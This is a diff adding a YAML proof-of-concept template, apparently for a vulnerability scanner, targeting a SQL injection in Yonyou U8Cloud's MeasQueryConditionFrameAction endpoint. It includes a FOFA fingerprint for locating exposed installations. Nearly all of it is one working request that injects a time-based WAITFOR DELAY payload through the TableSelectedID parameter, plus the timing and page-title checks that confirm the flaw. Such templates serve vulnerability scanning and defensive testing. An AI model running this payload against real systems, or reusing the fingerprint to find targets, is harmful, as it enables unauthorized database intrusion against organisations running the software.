@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8cloud-measqueryconditionframeaction-sqli
+info:
+  name: 用友U8Cloud MeasQueryConditionFrameAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--+
+  expression: 'contains(title,"错误提示 - iUFO") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
